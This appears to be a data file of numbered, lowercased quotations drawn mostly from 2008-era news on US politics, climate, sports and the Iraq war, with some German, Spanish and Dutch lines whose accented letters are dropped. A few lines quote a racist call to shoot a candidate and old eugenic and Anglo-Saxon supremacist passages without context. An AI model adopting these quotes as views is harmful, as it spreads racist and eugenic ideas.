8601621 we err on the side of being extremely conservative because the numbers are so good
8601622 based on the distance of those flights it can determine the size of the jet that youd be taking
8601623 its very intuitive because of what our developers have built into it
8601624 the idea for this came from the governor janet napolitano herself who cast her efficiency review steering committee which is composed of senior staff in her office to basically go out and look for strategies that would help benefit the environment reduce travel and provide another basket of benefits that are associated with this kind of technology for web conferencing
8601625 we have end to end aes advanced encryption standard encryption that is the highest government level you can get
8601626 so that means everything that is leaving my computer right now gets encrypted and then it doesnt get unencrypted until it hits your computer
8601627 i think that in these times of tight budgets and increased sensitivity to the environment that web conferencing when done correctly can really provide a strong benefit for state and local governments
8601628 basically a true story but it just hasnt happened yet
8601629 a thrilling spectacle but ultimately distances the public from the problem
8601630 we were interested in blurring the lines between fact and fiction
8601631 its very important that the program is clearly labelled a drama and not a documentary
8601632 even though the chances of climate change are significant there are processes in place to manage the consequences
8601633 the bottom line is our cities are not going to run out of water
8601634 this movie is to climate science as frankenstein is to heart transplant surgery
8601635 the power of population is so superior to the power of the earth to produce subsistence for man that premature death must in some shape or other visit the human race
8601636 a terrifying glimpse of the none too distant future when climate change will force the worlds powers into a desperate struggle for advantage and even survival
8601637 there is a probability of wars including even nuclear wars if temperatures rise 2 to 3 degrees celsius
8601638 my background is 30 years in the strategic field and i look at this stuff and the potential for huge disruption to internal relationships and international relationships to me looks enormous
8601639 there is a range of possibilities here thats why these scenarios are not mutually independent each one is a free floating possibility and they depend on the amount of change that you have got but that basically is a question of dates
8601640 i dont imagine people reading this book will be empowered or disempowered to the extent that it will make a whole lot of difference to the balance of outcomes
8601641 im not a pessimist i dont think these are foregone conclusions we are on a large highway and there are any number of exits off this highway that we could take and avoid the bridge thats out down the road
8601642 but there are no guarantees that any of them will be taken and further down the highway very bad things will happen if the exits arent taken
8601643 samantha steen cant find any shoes to match her wedding dress
8601644 when her future mother in law is found stabbed with one of the stiletto shoes chosen to match samantha steens wedding dress sam suspects her perfect wedding is in trouble
8601645 hes engaged to another woman shes pregnant with another mans baby
8601646 i figured a good step in my preparation would be finding out what facebook is so ive started this page
8601647 attempting to take pictures on a public sidewalk of democratic senators and vip donors leaving a private meeting at the brown palace hotel
8601648 theres a moment where we needed to showcase a pack of cigarettes at one point i dont even think it wound up in the final cut and our designer whos been on almost every movie with us was like should we use nails and i was like no find some fake movie cigarette brand

8601656 oh sarah you have to look after your mother and stay strong
8601657 denn wir wollen ohnehin jedes spiel gewinnen au erdem steht die mannschaft genauso unter druck
8601658 es hat gehei en man wartet auf jeden fall einmal die hinrunde ab aber der druck hat sich nach dem letzten heimspiel gegen k rnten erh ht der verein musste ein zeichen nach au en setzen
8601659 ich kann niemandem aus der mannschaft vorwerfen dass er nicht wollte
8601660 wenn man teilweise acht spieler vorgeben muss wei man woran es liegt dass man weit hinten ist dann kommt noch mangelndes selbstvertrauen dazu und alles nimmt seinen lauf
8601661 die spielgenehmigung ist noch nicht da da macht es mehr sinn wenn er in vorarlberg bleibt und individuell trainiert
8601662 er hat nur einmal kurz mittrainiert da w rde es keinen sinn machen au erdem w re es auch den anderen spielern gegen ber unfair die w rden das nicht verstehen
8601663 die kapfenberger k nnen sich auf sch ne zusatzeinnahmen freuen weil viele arbeitslose trainer auf der trib ne sitzen werden
8601664 das spiel ist ein wegweiser f r die kommenden wochen
8601665 es n tzt nichts wenn wir einen schlagen aber dann gegen jeden verlieren
8601666 diese ausgangslage habe ich einmal beim gak selbst erlebt das w nsche ich keinem

8601677 they key for us will be having a strong transition from defense to offense palmer said
8601678 that means solid midfield play and putting away our scoring chances
8601679 we lost some very good players including the player of the year brad hilton wisbey said
8601680 but defensively we didnt give up a goal in the tournament last year and we have some good defenders back
8601681 we need to score more goals but more important we need to defend better than we did last year
8601682 our goals this season are to play with intensity and maintain our focus throughout each game heaton said
8601683 we have a great mix of returning players and new additions to the team as we come together well keep improving as the season progresses
8601684 the key is chemistry and getting everyone on the same page
8601685 the key for us will be staying injury free tallarico said
8601686 the huge concern is having just 20 kids in the program and having 12 seniors were not sure where the kids are going
8601687 tactically were already doing things we worked hard to do last year we dont have the speed we had last year but its a great group of kids and good chemistry so far
8601688 we have just enough players 27 to field two teams everyone should see a lot of action
8601689 we lost a lot of key players but we have talent martus said
8601690 well have a lot of players rotating positions to see where they best fit rff
8601691 our members and retirees have earned a fair and equitable contract through years of hard work sacrifice and uncertainty
8601692 todays vote of total support shows that the same spirit of unity and solidarity that saved the steel industry in north america and created the profitability now enjoyed by the companies is still alive and well in the men and women we represent
8601693 rescuers sighed a breath of relief when they observed sgt matthew tarleton exiting the heavy wooded area with the two young children on the back of his police atv
8601694 there was a boy who went to war like many other boys before him maybe it made him a man maybe it didnt maybe he already was a man maybe he wasnt maybe it doesnt matter maybe none of it does maybe it all does maybe
8601695 this is a disgusting decision on the part of the army command
8601696 i find it incredibly ironic that the day after the us supreme court issues a landmark decision concerning the second amendment of the constitution some midmanagement bureaucrat decides he can make a mockery of the first amendment
8601697 he made a decision when he was a senior in high school that he wanted to basically pay for his own education
8601698 matt the world is very different today than it was four years ago when you decided to pursue the rotc road for your education you havent taken your oath and the army could be reimbursed for the cost of your education
8601699 theres a reason most soldiers grow up in rougher neighborhoods than this theres a reason most soldiers grow up hunting deer in the woods instead of hunting for the right sized designer tee shirt at abercrombie amp fitch and theres a reason most soldiers come from the breadbasket of rural america and not from west coast suburbs we want to win the wars
8601700 in the center of anu al verona lies the imposing american castle known as a combat outpost the gravediggers and their brothers in arms reside here dirty tired and hardened by the daily rigors of war we all already imagine returning home to our families but wish to do so with our honor intact by making progress with the grander mission emplaced upon us across the street from this compound is proof that at least three years later the coalition of the willing is more than just an uncomfortably titled punch line estonians iraqi army ia and iraqi police ip operate out of this rustic structure who in very different ways all display a dark cynicism and fearlessness that sprouted from growing up in the third world the stones from being trapped behind the iron curtain and the iraqis from being locked in saddam husseins baathist basement coordinating all of these assets for the betterment of the republic of iraq can be a challenging task and sometimes degenerates into a walking monster of mental anguish for me and my men nobody said this would be easy and breaking up drunken fistfights between the ip and ia is only amusing the first time
8601701 she say her father would beat her if he knew she had a boyfriend especially a sunni boyfriend
8601702 my grandma was horrified when my mom told her she was marrying a catholic
8601703 i hope you dont die soldier that would be bad
8601704 my daddy doesnt want me to be in the soldiers cause he says that the irack will last forever maybe if he changes his mind ill see you in the irack
8601705 my cousin was in war but he got hurt now he has a big beard and drinks beer all day long my mom says he should get a job
8601706 can you send me back a bad guys head that would be cool
8601707 im going to study real hard so i dont have to go to iraq do you wish you had done better at school
8601708 not interested keep me on the line i want nothing to do with a lateral promotion that involves becoming a logistical whipping boy and terminal scapegoat for all things notgoodenough ive been out here in the wilds too long dealing with matters of life and death to go back to little america for powerpoint contests not me
8601709 like a spurned teenage blonde whose dreamboat crush tells her point blank that he prefers brunettes

8601712 if you think please think of us if you pray please pray for us the second half of our deployment will be just as challenging and dangerous as the first half
8601713 thank you for caring agree or disagree with the war if youre reading this you are engaged and aware as long as that is still occurring in a free society there is something worth the fighting for
8601714 sole provider of chipsets to sony nyse sne and microsoft nasdaq msft for their consoles
8601715 well we dont know how much time we have left how many days months or years
8601716 there is virtually no meaningful limit to what we could inject into the system
8601717 if it is not the end of the world it is the end of the current international financial system mm hmm
8601718 hillary told us in no uncertain terms that shell do everything she can to elect barack obama
8601719 that makes two of us actually that makes 18 million of us because like hillary i want all of you who supported her to vote for barack obama in november
8601720 if we could win arizona this year it would set such a milestone for the democratic party we would bury the republicans for 25 years
8601721 but ive been here before folks if anyone can screw this up its the democratic party
8601722 there were two words no convention speaker in 2004 could say george bush
8601723 if you cant defend yourself then you sure cant defend the american people
8601724 are going to make the swift boat ads look like public service announcements
8601725 guns n roses har blivit informerade om gripandet och l ter myndigheterna sk ta rendet
8601726 most folks have assumed that gore is off the vp list but he hasnt been slotted as a convention speaker yet which is curious since gore is one of the partys superstars and its most effective spokesperson on energy and the environment
8601727 are they holding off because hes a finalist for veep and i have two pretty good sources who say gore and obama are actively exploring an administration slot for al
8601728 if your are going to go with gore why not go with hillary who really earned her place there by campaigning for the presidency and winning 18 million supporters i guess it is too much to ask for a woman to be seriously considered even when she is qualified
8601729 barack obama has a good lead with women and an even greater potential to increase that lead
8601730 where he has shown the most room to grow is among these senior women
8601731 is not living up to his full potential with white older unmarried women
8601732 this is an issue that really demonstrates youre in touch with womens lives
8601733 opens us up to lawsuits for all kinds of problems
8601734 to all the candidates tell me your position on gun control as myself and other americans really want to know if our babies are safe
8601735 this is my baby purchased under the 1994 gun ban
8601736 i believe we ought to move it out let the individual communities decide their gun laws and how guns ought to be treated
8601737 it has had a devastating impact on elections because the nra has targeted and spent millions of dollars distorting individual members views and al gores views
8601738 the key is going to be also attacking poverty bringing people together dealing with those kids in the ghettos that are heavy users of gun violence and they are victims of gun violence to make sure that this country attacks the core problems of poverty having child care bringing parents together
8601739 are you going to be able to keep his baby safe
8601740 ill tell you what if that is his baby he needs help
8601741 i dont know that he is mentally qualified to own that gun
8601742 we should be working with law enforcement right now to make sure that we protect people against people who are not capable of knowing what to do with a gun because theyre either mentally imbalanced and or because they have a criminal record
8601743 get bitter they cling to guns or religion as a way to explain their frustrations
8601744 i dont want to comment on anything now let there be an official announcement
8601745 it was just the dynamics in that particular campaign that they happened to face
8601746 sometimes theres just a big element of luck in life
8601747 i congratulate senator barack obama on his selection of my friend
8601748 i have enjoyed for many years the opportunity to work with joe biden to bring strong bipartisan support for united states foreign policy
8601749 will continue to have widespread support for higher office during many years ahead
8601750 he selected lieberman and the two men not selected in 2000 wound up being our national ticket in 2004
8601751 so for evan bayh getting this far in this process points to only bigger and better things to come in the future in my view
8601752 dear i finished second or third in a contest where they dont give bronze or silver medals
8601753 a hoosier was considered so seriously for such an important post
8601754 i welcomed that and i came through in fine shape
8601755 and then they showed pictures of me in the kitchen making breakfast
8601756 senator biden was kind enough to say youve got a lot of years ahead of you and this could happen next time for you
8601757 i suspect obama might well have preferred bayh as his vice president in office but opted for the person he thought most likely to help in the campaign
8601758 bayhs future continues to be bright in the senate or in an obama administration
8601759 certainly has more to do with joe biden than evan bayh
8601760 hes still young by presidential campaign standards and hes got a great record and profile
8601761 i think that this process here more than in 2000 and 2004 exposed the rest of the nation to how great a leader he is in the democratic party and all the great assets he brings
8601762 we now know that barack obama doesnt truly respect hoosiers
8601763 i saw this earlier and having lived there for twelve years i absolutely refuse to believe that manchester came in second
8601764 the essence is to lead people design is the embodiment of the right information at the right time
8601765 how do we make money is the obvious common language between business and design
8601766 it took me quite a while to understand i learned the hard way
8601767 they narrow the solutions for us and can translate between business and design articulating benefits
8601768 at this point their egos could be through the roof
8601769 but they wanted to understand who we are and work according to that
8601770 it allowed bloomberg to evolve without abandoning what made us successful
8601771 they arent afraid of the tenuous line between art and design

8601784 verdammt wo zum teufel kommt die denn pl tzlich her
8601785 modificar radicalmente la estructura del teatro transform ndolo en una entidad cultural imprevisible y reduciendo la planta de personal lo m s profundamente posible para que termine funcionando como sala de alquiler y o como un teatro que sea atractivo para la contrataci n de terceros y la inversi n privada
8601786 la autarqu a que se quiere implementar a trav s de esta ley no significa otra cosa que la liberaci n de las trabas burocr ticas y administrativas para el control directo por parte del ejecutivo de las contrataciones y los trabajadores
8601787 la trampa est en que es un eufemismo no es que vaya a pasar a manos directamente de terceros o se vaya a terciarizar alguna de las actividades propias del teatro sino que el teatro en s va a pasar a prestar servicios a terceros sin ning n tipo de discriminaci n o control
8601788 eso nos parece realmente un atropello y verdaderamente una locura como sistema de funcionamiento institucional porque transforma al teatro en algo totalmente imprevisible si cada cuatro a os por el capricho del directorio vamos a cambiar el sistema de trabajo y del funcionamiento interno no va a ser posible establecer una normalidad que permita eficiencia y calidad
8601789 por otro lado agrega esos mismos directores est n nombrados a dedo por el sistema pol tico porque no son funcionarios de carrera y a ninguno se le exige ni siquiera tener antecedentes en la gesti n cultural
8601790 los cuerpos estables de trabajadores no estamos nombrados en la ley explica el fot grafo estamos mencionados de forma bastante breve y malintencionada porque si bien aclara que se va a respetar la antig edad y la continuidad del salario tal como estaba s lo se har para aquellos que al momento de la sanci n de la ley pertenezcan a la planta permanente y como dentro de la planta hace bastante que no hay concursos la mayor a de los trabajadores no somos permanentes sino contratados si se sanciona la ley esos contratados volar n porque no son estables los que no son planta permanente se quedar n sin trabajo
8601791 todo se maneja por vericuetos en la legislatura revela parpagnoli si hubieran querido realmente lograr un acuerdo hubieran propuesto una asamblea general donde debatir el proyecto con la mayor a de los trabajadores en una discusi n plena o en tal caso hacer una audiencia p blica
8601792 si quieren plantear un cambio institucional abramos el teatro pong moslo a producir con la gente adentro que es lo primero que es necesario porque sino cual va a ser el par metro para medir que la autarqu a funciona bien si el teatro est cerrado y sin actividad
8601793 la situaci n del teatro es un desastre los arquitectos se mandaron bastantes cagadas

8601800 keep a quality service up and running especially in the face of
8601801 america cannot afford four more years of this again and again on the most important national security issues of our time john mccain was wrong and barack obama was proven right
8601802 millions of americans have been knocked down and this is the time as americans together we get back up back up together
8601803 we dont usually have that number of aryan nations people here mr ross said
8601804 it was suspicious to us we turned everything over to the federal authorities
8601805 he adolf said at one point yes it would be on probably the day of his acceptance speech
8601806 it would be from a high vantage point with the named rifle
8601807 he dont belong in political office blacks dont belong in political office he should be shot
8601808 looking back at it i dont want to say yes but i dont want to say no
8601809 we realise that it takes a cold blooded pragmatic and realist viewpoint to enact the changes which will be necessary to achieve our goals
8601810 were absolutely confident there is no credible threat to the candidate the democratic national convention or the people of colorado

8601814 with all of americas top polling companies to choose from knxv chose surveyusa
8601815 surveyusa is one of the most professionally run research companies in america
8601816 surveys play a vital role in understanding how we can better serve and communicate with our community
8601817 were able to build entire newscasts around the information we get from surveyusa
8601818 18 of survey usas final polls were the closest for that state almost twice as many as every other major poll put together
8601819 surveyusa has been more open and has provided better data than virtually all other survey houses whether conventional or automated calling
8601820 i have complete peace of mind when i pick up the phone to call surveyusa
8601821 they responded immediately and did a great job for us
8601822 i have been impressed by their professionalism and dedication to the science of public opinion
8601823 being a union minister i can responsibly say that no foreign country can interfere in indias military strategy once the india us nuclear agreement gets operational
8601824 nuclear power is the only resource to fulfil our energy requirement by 2021 the communist party of india marxist cpi m is just misleading students and youths about the deal
8601825 some political parties dont want india to progress in the coming days
8601826 has confirmed that he is going to give a fundraiser for sen obama
8601827 from now through election day i intend to do whatever i can to make sure he is elected president of the united states
8601828 the bottom line is presidential campaigns are marathons that require physical fortitude beyond anything you ever see in politics
8601829 setting aside time with your family time to exercise and time just to clear your head and think is an imperative not a luxury and its also the hardest thing the candidate has to find time to do
8601830 many people would and he seems to be one of them find that they get some kind of solace or opportunity for decompression and relaxation
8601831 it was hard to connect to al gore to relate to gore in 2000
8601832 the question of bush and who youd rather have a drink with may have said more about gore than george bush
8601833 for sen obama and michelle their family comes first that has meant making time for the kind of family activities they enjoyed before the campaign
8601834 it took six years for india to understand the sensitivities of asean and for the asean to understand the sensitivities of india
8601835 the ministers agreed to target implementation of tariff reduction commitments starting 1 january 2009
8601836 this will lead to greater integration between asean and its dialogue partner
8601837 india is ready the onus is on asean to gather its team and start negotiations on services and investment
8601838 so the potential for enhanced economic engagement between asean and india is profound
8601839 rapeseed mustard is an important oilseed crop commodity contributing 26 1 and 29 1 percent respectively to the total oilseed hectarage and production in india
8601840 the development of hybrid in indian mustard the second most important oilseed crop of the country will help enhance the productivity of the mustard crop
8601841 the brazil mine has a reserve of 300 500 million tonnes while the columbian mine has an estimated reserve of 60 70 million tonnes
8601842 in both these mines we will have a share of around 20 30 percent
8601843 im going to hang around and walk through the convention hall and shake as many hands as seem to be friendly
8601844 they say i got them into politics not the young ones of course
8601845 they invite us we wave everybody cheers we sit down
8601846 i think hes more ready for it clearly by far than i was
8601847 i had a lot of preconceived ideas about this film of the kind of views that it was going to push but i have to say it did examine the issues from both sides
8601848 however that said i strongly feel that shoot on sight cynically exploits the tragic shooting of de menezes and the events leading up to it
8601849 i think that showing this in cinemas can only add to the distress and grief felt by the de menezes family and the survivors of 7 7 and those who lost loved ones on that day
8601850 the hurt and pain doesnt go away overnight but ultimately it wasnt the predictable plot or poor acting that caused offence to me but the cynical attempt to make money from a tragic event
8601851 for example the police officer who shoots the muslim man isnt portrayed as a cut and dried racist i thought it was quite a clever twist that the police commissioner who is put in charge with investigating the shooting is a muslim himself
8601852 i thought it was pretty tacky that they clearly used the de menezes shooting as the basis for the plot i wouldnt be happy if i was a member of his family
8601853 i dont understand why they made the character who was so clearly based on de menezes muslim rather than brazilian it was clearly just to provoke controversy i dont think i would ever go and see this film at the cinema but it isnt as anti english as i was expecting
8601854 we are not taking sides just making a dramatic thriller and trying to explore racial bias
8601855 efforts to build up and disseminate greater knowledge about man made climate change and to lay the foundations for the measures that are needed to counteract such change
8601856 the mere fact that diane nash was born and raised on the southside of chicago but ended up in nashville tn at fisk as one of the movements most dynamic young leaders is astounding while just a few miles away in carthage tn was al gores home and later gore moved to nashville to work as a journalist while ms nash was on the front lines of the civil rights movement in this country mr gore was in vietnam although they started in tennessee with separate missions what they did through out their lives changed the nation and impacted the world i look forward to hearing their testimonies
8601857 we feel that if we pay these fines we would be contributing to and supporting the injustice and immoral practices that have been performed in the arrest and conviction of the defendants
8601858 do you feel it is wrong to discriminate against a person solely on the basis of their race or color
8601859 the former u s vice president is just desperate for attention because he has no friends
8601860 a nashville based free market think tank and watchdog organization
8601861 its easy i think of a man and i take away reason and accountability
8601862 his peccadillo defined as a slight offense in no way detracts from his ability to further his primary goal which is to eliminate poverty
8601863 the surprise for me is that he had only one affair
8601864 not pretend we can achieve his goal without cost or without sacrifice
8601865 new energy economy will create new businesses new industries and millions of new jobs jobs that pay well jobs that cant be outsourced good union jobs
8601866 we will get one million 150 mile per gallon plug in electric hybrids on our roads within six years
8601867 american people to meet the goal of reducing our demand for electricity 15 percent by the end of the next decade
8601868 the largest profit in the history of the united states this is the company that last quarter made 1 500 every second thats more than 300 000 in the time it takes you to fill up a tank with gas thats costing you more than 4 a gallon
8601869 malthus was right in predicting that the population would grow geometrically but he didnt foresee our ability to make geometric improvements in agricultural technology even today with several countries in the world suffering massive famines there is little doubt that a commitment to use more land and newer agricultural methods could vastly increase the amount of food produced on earth the problem we now face is therefore more complicated than the one malthus identified in theory the food supply can keep up with the population for a long while yet but in practice we have chosen to escape the malthusian dilemma by making a set of dangerous bargains with the future worthy of the theatrical legend that haunted the birth of the scientific revolution doctor faustus
8601870 observations concerning the increase of mankind peopling of countries etc
8601871 the great increase of offspring in particular families is not always owing to greater fecundity of nature but sometimes to examples of industry in the heads and industrious education by which the children are enabled to provide better for themselves
8601872 we are the finest race in the world and that the more of the world we inhabit the better it is for the human race just fancy those parts that are at present inhabited by the most despicable specimens of human beings what an alteration there would be if they were brought under anglo saxon influence i contend that every acre added to our territory means in the future birth to some more of the english race who otherwise would not be brought into existence
8601873 are reproducing relatively too fast therefore birth control methods must be taught them they must not have too easy access to relief or hospital treatment lest the removal of the last check on natural selection should make it too easy for children to be produced or to survive lengthy unemployment should be grounds for sterilization or at least relief should be contingent upon no further children being brought into the world and so on since a high degree of intellect and imagination of scientific and artistic ability and other qualities cannot be adequately expressed or utilized in the great majority of the lower strata it is useless to plan for their genetic increase in these strata indeed it is more than useless it is dangerous for the frustration of inherent capacity leads to discontent and revolution in some men to neurosis and inefficiency in others the case is strictly analogous to that of cattle in africa in an unfavorable environment too drastic genetic improvement is worse than none
8601874 it will be necessary quite soon to face the fact that only a certain fraction of any human population is equipped by heredity to be able to take full or even reasonable advantage of a full higher or professional education
8601875 thus even though it is quite true that any radical eugenic policy will be for many years politically and psychologically impossible it will be important for unesco to see that the eugenic problem is examined with the greatest care and that the public mind is informed of the issues at stake so that much that now is unthinkable may at least become thinkable
8601876 now is that time for all good men and women to come to aid of the country the people the planet and the truth
8601877 isnt it getting colder of course it is because sun spot activity has stopped almost entirely now global warming advocates sound like george bush 5 years ago they say global climate change and rarely global warming what could be more hypocritical report this comment
8601878 you need to go back to a 19th century lifestyle of candlelight and mule power
8601879 the ipcc is a scientific intergovernmental body set up by the world meteorological organization and by the united nations environment programme
8601880 the governments the ipcc is open to all member countries of wmo and unep governments of participate in plenary sessions of the ipcc where main decisions about the ipcc workprogramme are taken and reports are accepted adopted and approved they also participate the review of ipcc reports
8601881 leaving my television on all day and night so i can increase my global footprint
8601882 the decisions to develop ice minus bacteria herbicide resistant plants and bovine growth hormone lent credibility to those who argued that biotechnology would make things worse before it made things better
8601883 my biggest fear about biotechnology is not that by accident we will set loose some genetically defective andromeda strain given our past record in dealing with agriculture were far more likely to accidentally drown ourselves in a sea of excess grain
8601884 but it appears that the democratic party at the top is hopelessly in the grip of corporate interests that favor war free market nostrums and corporate welfare
8601885 if id wanted to vote for a republican id vote for the real one every time
8601886 the same fate she would have suffered had she won the nomination
8601887 lets vote for ralph and fuck up another 4 years with mccain
8601888 many americans have a hard time thinking about our energy future largely because their energy present is so challenging
8601889 staying on our present track is an invitation to sustained higher prices
8601890 if policies reward reducing global warming pollution private capital will flow towards clean energy solutions
8601891 he does not feel that obama has given him the respect due to him as a former president
8601892 he should have called clinton and asked him for advice about foreign policy or suggested a joint appearance
8601893 dream in color how the sanchez sisters are making history in congress
8601894 without a doubt there are certain members of congress who still believe women dont belong there and there are those who see women just as sexual objects
8601895 try to use their femininity or their good looks to finagle things out of people and the other members really resent that
8601896 male superiority is very deeply ingrained in some latino men of a certain generation
8601897 and baca belongs to that camp although he would certainly deny that
8601898 any claims of male superiority within the congressional hispanic caucus are simply not true
8601899 we place value on the commitment and hard work necessary to advance the goals of the latino community not ones gender
8601900 i dont remember a time in our country when so many things seemed to be going so wrong simultaneously
8601901 our economy is in terrible shape and getting worse gasoline prices are increasing dramatically and so are electricity rates
8601902 the climate crisis in particular is getting a lot worse much more quickly than predicted
8601903 were borrowing money from china to buy oil from the persian gulf to burn it in ways that destroy the planet every bit of thats got to change

8601907 i tried to warn them but the elders of this planet would not listen
8601908 they called me foolish and laughed at my predictions yet even now the midwest is flooded the ice caps are melting and the cities are rocked with tremors just as i foretold fools why didnt they heed me before it was too late
8601909 if hed been president we wouldnt have had these bush administration messes the past eight years
8601910 also we admire his tenacity in protecting the environment many share his vision on what needs to be done
8601911 theres a short list for show and then theres the actual short list
8601912 the ultimate fascination with veepstakes is as much about who is on the list as much as who might actually be chosen
8601913 that was a classic example of people benefiting from being on the list
8601914 before if you followed the nfl it was enough just to know the player
8601915 now more fans tend to know who the strength coach is for the baltimore ravens

8602078 the equivalent insulation to a typical football uniform is like wearing a full three piece mens business suit
8602079 its not uncommon during prolonged intense exercise for us to be able to measure temperatures in athletes of 103 or 104 degrees fahrenheit
8602080 take frequent breaks that allow players to get out of the sun and into the shade allow them to take their helmets off during breaks and in some cases their shirts and shoulder pads anything to periodically cool the players
8602081 i remember last year we had a game where the heat was just excruciating
8602082 and we were playing a county school and they dont follow the same rules as we do
8602083 i had a few grimaces and growls from the coaches
8602084 but they knew it was the right thing to do and thats what we did
8602085 nobodys going to call you a sissy or a chicken or a baby or whatever they used to call you in the old days
8602086 if somebody doesnt look too good you go over put your arm around em and just see whats going on
8602087 when barack obama accepts the democratic nomination to become the president of the united states of america and starts speaking i think all of america and many parts of the world the hopes the longings the aspirations and the dreams will be hanging on every word he says
8602088 its going to be incredible you know people died some people didnt make it to the march on washington they were beaten they were tear gassed some were shot and killed and even after the march on washington where there had been so much hope so much optimism we had to deal with the bombing on a church in birmingham where four little girls were killed but ive cried all my tears
8602089 he is free of a lot of the battles and scars that many of us suffered
8602090 he never saw the signs that said white men colored men white women colored women
8602091 he never tasted the fruits of segregation and racial discrimination so he is a different human being he should be free to liberate the rest of america and maybe take a message to the rest of the world
8602092 at 15 she had a huge breakdown and had to return home to louisiana
8602093 she was very insecure and felt like she wasnt pretty
8602094 theres no doubt based on the last two years that she is a highly unstable person
8602095 shes on a temporary high right now but shes never really dealt with all the problems she had i dont think its possible to turn over a new leaf just like that
8602096 i dont think were there yet and i dont think well get there if we stayed until 6 in the morning

8602105 prior studies have indicated reduced bone density in hiv infected patients but little was known whether fracture risk increased in this population
8602106 these data are the first to suggest that there is a clinically significant increase in bone fractures among hiv infected patients using data from a large healthcare system
8602107 hiv patients with risk for low bone density should be assessed and potentially treated to prevent fractures
8602108 further research is needed into the mechanisms of bone loss in this population
8602109 fracture prevalence among hiv infected versus non hiv infected patients in a large u s healthcare system

8602114 bioglass is used to help mend broken bones recently researchers working at imperial college discovered a new kind of bioglass which seemed to work better but they could not work out all the details why
8602115 we looked at it through our nmr machine and were amazed by what we saw fluid simulating patients bodies rushed calcium out of the bioglass and then into the new bones it seems perhaps a glass of milk a day really is what the doctor ordered

8602123 while most of that is common knowledge what most people overlook is the glaring lack of any community aspect to itunes there are millions of people many of them with similar tastes flocking to the same destination every day yet they never interact with each other because they cant if kevin rose is to be believed however as discussed on twit 157 that all is about to change with itunes 8 0 he says the one thing i hear about itunes 8 0 is that its gonna do something along the lines of um looking at your music and uh kind of recommendations based on certain things in other words the next version of itunes will monitor your media purchasing and consuming habits and correlate them with everyone else using the system to figure out which songs you will probably like but havent bought listened to if youre a fan of collaborative filtering systems or internet radio pandora last fm etc youre probably familiar with the idea already and that itunes may be considering implementing this doesnt come as a surprise i found myself wondering why this wasnt introduced 2 3 years ago
8602124 studies show primary aldosteronism may be more prevalent than previously thought affecting more than ten percent of hypertensive patients
8602125 the new guideline uses the best available research to help physicians diagnose primary aldosteronism and employ specific treatments that can alleviate the impact of this condition
8602126 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8602127 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8602128 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8602129 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8602130 today we use hp dl580 g5 to handle larger server workloads
8602131 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8602132 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8602133 second as others have pointed out mccain is perilously close to turning his pow record into a punchline
8602134 like so many john mccain served our country bravely and suffered for years as a pow for that he deserves our thanks and respect and we have paid and continue to pay him that respect but having been a pow is not an excuse for a litany of bad votes in the senate and wrong positions as a candidate having been a pow is not an excuse for voting against veterans benefits or an excuse for supporting president bushs tax cuts for the wealthy or an excuse for supporting the use of torture john mccain was a brave soldier but he cannot hide behind that experience and use it as an excuse for every bad decision hes made since hes being anything but brave as a senator and as a candidate he should continue to use that bravery to try to defend those positions if he truly believes in them he should not hide behind his war experiences thats the opposite of bravery if they can figure out an artful term for it call him a damn wimp
8602135 we had to sit around in the dirt and eat if we were lucky
8602136 that would be like creating another japan or fighting world war ii all over again

8602139 because man is a composite being spirit and body there already exists a certain tension in him a certain struggle of tendencies between spirit and flesh develops but in fact this struggle belongs to the heritage of sin it is a consequence of sin and at the same time a confirmation of it it is part of the daily experience of the spiritual battle
8602140 the alternative is clear either man governs his passions and finds peace or he lets himself be dominated by them and becomes unhappy
8602141 self mastery is a long and exacting work one can never consider it acquired once and for all it presupposes renewed effort at all stages of life

8602144 the royal navy does not tolerate misuse of drugs by its personnel and internal action is under way against all 18 individuals

8602146 we are not complacent though and our compulsory drug tests will continue to expose those few that let the rest down
8602147 its not batman that makes you worthwhile its the other way around never tell yourself anything different
8602148 want zelfs met de verwachte stijging van studenten komen we er nog niet kijken we maar naar de ingenieurs jaar na jaar moeten we zelfs vaststellen dat er in vlaanderen een kwart te weinig afstuderen om aan de vraag te voldoen en als de stijging van 7 procent zich doorzet dan zullen we binnen 4 5 jaar nog steeds enkele honderden ingenieurs tekort komen
8602149 zoals het er nu voor staat zullen vlaamse technologiebedrijven tegen 2015 een derde van hun technisch geschoolden in het buitenland moeten gaan zoeken daarom willen we nog meer belgen warm maken voor wetenschap en technologie

8602161 no other asian country has put up less resistance to the influx of western culture than the philippines did
8602162 its a gutsy move to persist and make this film a metro manila film festival entry in these times the film has muslims as all its main protagonists and takes an unflinching moro muslim point of view then this point of view is used searingly to debunk a lot of the preconceptions and vague generalities that may abound about the conflict in mindanao this muslim pov is not one that a lot of people may be very sympathetic to right now

8602199 organisations going for the informal approach can lack structure in their environmental policies and this can affect the level of success that they achieve in reducing both energy costs and co2 emissions
8602200 while computers may drive efficiency the data centres that run businesses are often far from efficient they are at the heart of environmental challenges created by it but the average retailer just does not have the necessary knowledge to bring about change they need specialist help and the actions we offer in our thought leadership initiatives are designed to illustrate how they can improve their carbon footprint and wider environmental position while also reducing operating costs and improving it service delivery

8602203 in todays media environment it is vital that businesses communicate online and companies that choose to ignore this are running a major risk traditional pr tactics are not going to go away anytime soon but it is essential for companies to integrate online pr and social media into their existing offline communications strategies
8602204 despite finding that an increasing number of uk pr professionals are on the ball when it comes to online pr this survey confirms our experience that a high proportion are still more focused on traditional media however given that this is most probably a reflection of client budget and resource allocations perhaps what we should be asking ourselves is what this says about uk business attitude towards online communications

8602245 the second commandment of the teaching you shall not murder you shall not commit adultery you shall not seduce boys you shall not commit fornication you shall not steal you shall not practice magic you shall not use potions you shall not procure an abortion nor destroy a newborn child
8602246 the way of light then is as follows if anyone desires to travel to the appointed place he must be zealous in his works the knowledge therefore which is given to us for the purpose of walking in this way is the following thou shalt not slay the child by procuring abortion nor again shalt thou destroy it after it is born
8602247 and near that place i saw another strait place and there sat women and over against them many children who were born to them out of due time sat crying and there came forth from them rays of fire and smote the women in the eyes and these were the accursed who conceived and caused abortion
